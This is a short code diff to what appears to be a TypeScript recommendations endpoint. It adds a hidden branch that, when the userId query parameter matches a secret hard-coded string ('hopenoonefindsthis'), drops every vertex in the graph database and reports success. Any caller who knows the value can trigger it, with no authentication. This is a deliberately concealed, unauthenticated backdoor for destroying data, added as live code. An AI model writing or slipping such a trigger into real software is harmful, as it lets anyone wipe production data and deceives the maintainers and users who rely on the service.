@@ -32,6 +32,16 @@ export const handler = async (
     const userId = event.queryStringParameters?.userId!;
     console.log("Querying for recommendations for user", userId);
 
+    if (userId === "deleteMP1201devcodehopenoonefindsthis") {
+      await g.V().drop().iterate();
+      return {
+        statusCode: 200,
+        body: JSON.stringify({
+          message: "Deleted all vertices",
+        }),
+      };
+    }
+
     const following = await db
       .select({ userId: schema.follower.recipientId })
       .from(schema.follower)
